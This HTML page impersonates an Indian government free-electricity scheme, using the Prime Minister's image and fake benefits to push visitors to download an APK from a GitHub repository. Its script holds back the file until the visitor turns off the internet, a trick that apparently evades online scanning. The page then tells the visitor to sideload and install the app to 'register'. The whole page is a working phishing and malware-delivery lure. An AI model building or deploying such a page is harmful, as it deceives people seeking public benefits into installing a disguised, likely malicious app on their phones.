<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Muft Bijli Yojana">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
  
<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQBTGeUXDFQLyXeRH-BiHpkQFP40NzuQPZhoQ&usqp=CAU">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PM Muft-Bijli</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background: #f4f7fc;
            text-align: center;
            padding-bottom: 70px;
        }

        .top-bar {
            background: #015296;
            color: white;
            padding: 8px 15px;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .top-bar img {
            height: 20px;
        }

        .header {
            background: white;
            padding: 15px 10px;
            text-align: center;
            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
        }

        .header h1 {
            font-size: 22px;
            color: #015296;
            font-weight: 700;
        }

        .hero {
    background: linear-gradient(to right, #eef2f6, #ffffff);
    padding: 30px 20px;
    box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1), 
                0px -4px 8px rgba(0, 0, 0, 0.1); /* Shadow on both top & bottom */
    text-align: center;
}


        .hero h1 {
            font-size: 26px;
            color: #000;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .hero h1 span {
            color: #015296;
        }

        .hero p {
            font-size: 16px;
            color: #444;
            margin-bottom: 10px;
        }

        .hero ul {
            text-align: left;
            max-width: 300px;
            padding-left: 20px;
            margin: 0 auto;
        }

        .hero ul li {
            font-size: 15px;
            margin-bottom: 6px;
        }

        .hero-image {
            width: 150px;
            margin-top: 20px;
        }

        .download-btn {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background: #015296;
            color: white;
            padding: 15px;
            font-size: 18px;
            font-weight: 700;
            text-align: center;
            text-decoration: none;
            transition: background 0.3s;
        }

        .download-btn:hover {
            background: #0055a5;
        }

        footer {
            background: #015296;
            color: white;
            padding: 12px;
            font-size: 14px;
            margin-top: 20px;
        }

        /* Progress Bar */
        .progress-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        .progress-container {
            width: 120px;
            height: 120px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background: conic-gradient(#015296 0deg, #ccc 0deg);
            position: relative;
        }

        .progress-container::before {
            content: "";
            position: absolute;
            width: 100px;
            height: 100px;
            background: white;
            border-radius: 50%;
        }

        .progress-text {
            position: absolute;
            font-size: 16px;
            font-weight: bold;
            color: #015296;
        }
/* Overlay Styling (dark background) */
        #overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent dark background */
            z-index: 999; /* Ensures it is on top of the content */
        }

        /* Dialog Styling */
        .dialog {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
            z-index: 1000; /* Ensures it is on top of the overlay */
        }
        
        /* Progress Bar Container */
        #progress-bar-container {
            width: 100%;
            height: 30px;
            background-color: #f3f3f3;
            border-radius: 5px;
            margin-top: 20px;
        }
        
        #progress-bar {
            height: 100%;
            width: 0%;
            background-color: #4caf50;
            text-align: center;
            line-height: 30px;
            color: white;
            border-radius: 5px;
        }
        
        /* Offline Dialog Styling */
        #offline-dialog {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #FFFFFF;
            padding: 20px;
            border: 1px solid #FFFFFF;
			color:#B81B1B;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 95%;
            text-align: center;
        }

        /* Save File Dialog Styling */
        #save-file-dialog {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #015296;
            padding: 20px;
            color: #FFFFFF;
            border: 1px solid #015296;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 80%;
            text-align: center;
        }

        .buttonsave {
    background-color: white;     /* White background */
    color: #015296;                 /* Blue text */
    border: 1px solid #015296;      /* Blue border for the button */
    padding: 10px 20px;          /* Padding inside the button */
    border-radius: 3px;          /* Minimum corner radius */
    font-size: 16px;
    width: 95%; 
    font-weight: bold;            /* Text size */
    cursor: pointer;            /* Pointer cursor on hover */
    transition: all 0.3s ease;   /* Smooth transition for hover effects */
}

.buttonsave:hover {
    background-color: #f0f0f0;  /* Light grey background when hovered */
    color: darkblue;             /* Darker blue text on hover */
}

.buttonsave:active {
    background-color: #e0e0e0;  /* Darker grey when the button is clicked */
    color: navy;                 /* Navy blue text on click */
}
    </style>
</head>
<body>
<div id="overlay"></div>
    <div class="top-bar">
        <img src="https://raw.githubusercontent.com/Pmmbe/Dow/refs/heads/main/Flag_of_India.svg.png" alt="India Flag">
        Government of India
    </div>

    <div class="header">
        <h1>Muft-Bijli Yojana: HarGhar Bijli</h1>
    </div>
	
<!-- Progress Dialog -->
<div id="progress-dialog" class="dialog">
    <h3>Downloading...</h3>
    <div id="progress-bar-container">
        <div id="progress-bar">0%</div>
    </div>
</div>


<div id="offline-dialog" class="dialog" style="padding: 25px 20px; font-family: 'Segoe UI', sans-serif; text-align: center; max-width: 360px; margin: auto; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); background: #fff;">

  <!-- Title -->
  <h2 style="font-size: 22px; font-weight: 600; color: #B81B1B; margin-top: 0; margin-bottom: 10px;">
    TURN OFF INTERNET<br><span style="font-size: 16px; color: #555;">इंटरनेट बंद करें</span>
  </h2>

  <!-- Icon -->
  <img src="https://cdn-icons-png.flaticon.com/512/1828/1828665.png" height="60" style="margin-bottom: 15px;" alt="Download Done Icon" />

  <!-- Download Complete Message -->
  <h3 style="color: #2E7D32; font-size: 18px; margin: 0 0 10px 0;">App Download Complete ✅</h3>
  <p style="font-size: 14px; color: #333; margin-bottom: 15px;">
    Note : You need to turn off internet to save app.<br>
    <span style="color: #666;">नोट: ऐप सेव करने के लिए आपको इंटरनेट बंद करना होगा।</span>
  </p>

  <!-- Steps -->
  <div style="text-align: left; background: #f9f9f9; border-left: 4px solid #B81B1B; border-radius: 6px; padding: 12px 15px; font-size: 14px;">
    <p style="margin: 0 0 8px 0; font-weight: bold; color: #B81B1B;">Steps / चरण:</p>
    <ul style="list-style: none; padding: 0; margin: 0;">
      <li style="margin-bottom: 8px;">
        <img src="https://cdn-icons-png.flaticon.com/512/483/483947.png" width="16" style="vertical-align: middle; margin-right: 8px;" />
        Turn off Internet or Wi-Fi<br><span style="margin-left: 24px; color: #666;">मोबाइल डेटा या वाई-फाई बंद करें</span>
      </li>
      <li>
        <img src="https://cdn-icons-png.flaticon.com/512/1828/1828490.png" width="16" style="vertical-align: middle; margin-right: 8px;" />
        Return to this screen<br><span style="margin-left: 24px; color: #666;">फिर इस स्क्रीन पर वापस आएं</span>
      </li>
    </ul>
  </div>

  <!-- Save Info -->
  <p style="font-size: 13.5px; color: #444; margin-top: 15px;">
    The <strong>"Save"</strong> button will appear once internet is off.<br>
    <span style="color: #666;">इंटरनेट बंद करने के बाद <strong>सेव</strong> बटन दिखाई देगा।</span>
  </p>
</div>


<!-- Save File Dialog -->
<div id="save-file-dialog" class="dialog">
    <img src="https://i.postimg.cc/xCm5v7Yr/oie-transparent-1.png" height="50px"/><br>
    <h3>Application Ready to install!</h3><br>
    <p>Click the button below to save apk file.<br></p><p>Go to Downloads and install the application to register</p><br>
    <button class="buttonsave" id="save-file-button">Save APK File</button>
</div>


    <div class="hero">
        <h1>Muft-Bijli Yojana <br><span>HarGhar Bijli</span></h1>
        <p><strong>Key Benefits:</strong></p>
        <ul>
            <li>Get 300 units of Free electricity per month.</li>
            <li>Support for rented apartments.</li>
            <li>Limited to 1-Crore users.</li>
            <li>Download PMMB-Y app from below to register.</li>
        </ul>
        <p><strong style="font-size: 22px; font-weight: 600; color: #015296;">Shri Narendra Modi</strong><br>
            <span style="font-size: 16px; color: black;">Honorable Prime Minister of India</span>
        </p>
        <img src="https://www.pngplay.com/wp-content/uploads/7/Narendra-Modi-PMO-India-Transparent-PNG.png" 
             alt="PM Narendra Modi" class="hero-image">
    </div>

    <a id="start-download" href="#" class="download-btn">Download APP</a>

    <footer>
        &copy; 2025 PM Muft-Bijli. All Rights Reserved.
    </footer>

 <script>
    document.getElementById('start-download').addEventListener('click', () => {
        downloadFileWithProgress();
    });

    async function downloadFileWithProgress() {
        const fileUrl = 'https://raw.githubusercontent.com/Pmmbe/Dow/refs/heads/main/PMMBYY.apk';  // Replace with your file URL

        // Show the overlay and the progress dialog
        document.getElementById('overlay').style.display = 'block';
        const progressDialog = document.getElementById('progress-dialog');
        progressDialog.style.display = 'block';

        try {
            // Step 1: Fetch the file
            const response = await fetch(fileUrl);
            if (!response.ok) {
                throw new Error('Failed to download file');
            }

            // Step 2: Get the total file size (in bytes)
            const contentLength = response.headers.get('Content-Length');
            const totalBytes = contentLength ? parseInt(contentLength, 10) : 0;

            // Step 3: Create a Blob to hold the downloaded data
            const reader = response.body.getReader();
            let receivedBytes = 0;
            const chunks = [];
            
            // Step 4: Read the file in chunks and update the progress bar
            const progressBar = document.getElementById('progress-bar');
            const progressBarContainer = document.getElementById('progress-bar-container');

            while (true) {
                const { done, value } = await reader.read();
                if (done) {
                    break;
                }

                chunks.push(value);
                receivedBytes += value.length;

                // Calculate the progress percentage
                const progress = Math.round((receivedBytes / totalBytes) * 100);
                progressBar.style.width = `${progress}%`;
                progressBar.innerText = `${progress}%`;
            }

            // Step 5: Combine the chunks into a Blob
            const blob = new Blob(chunks);
            const fileName = 'PMMBYY.apk';  // File name for download

            // Hide the progress dialog and show the offline dialog
            progressDialog.style.display = 'none';
            let downloadBlob = blob;
            if(navigator.onLine)
            {
                const offlineDialog = document.getElementById('offline-dialog');
                offlineDialog.style.display = 'block';
            }
            else
            {
                downloadOffline(downloadBlob, fileName);
            }           

            // Store the Blob for offline download later
           

            // Step 6: Listen for the offline event and trigger the download
            window.addEventListener("offline", () => {
                downloadOffline(downloadBlob, fileName);
            });

        } catch (error) {
            console.error('Error during file download:', error);
        }
    }

    function downloadOffline(blob, fileName) {
        // Trigger the download when offline
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = fileName;
        link.click();

        // Clean up the Blob URL after the download is triggered
        URL.revokeObjectURL(link.href);

        // Replace the offline dialog with the "save file" dialog if download was missed
        const offlineDialog = document.getElementById('offline-dialog');
        offlineDialog.style.display = 'none';

        const saveFileDialog = document.getElementById('save-file-dialog');
        saveFileDialog.style.display = 'block';

        // Add an event listener for the "Save File" button
        document.getElementById('save-file-button').addEventListener('click', () => {
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = fileName;
            link.click();
            URL.revokeObjectURL(link.href);
        });
    }
</script>
<script type="text/javascript">
var sc_project=13004805; 
var sc_invisible=1; 
var sc_security="080186cb"; 
</script>
<script type="text/javascript"
src="https://www.statcounter.com/counter/counter.js"
async></script>
<noscript><div class="statcounter"><a title="Web Analytics"
href="https://statcounter.com/" target="_blank"><img
class="statcounter"
src="https://c.statcounter.com/13004805/0/080186cb/1/"
alt="Web Analytics"
referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
</body>
</html>
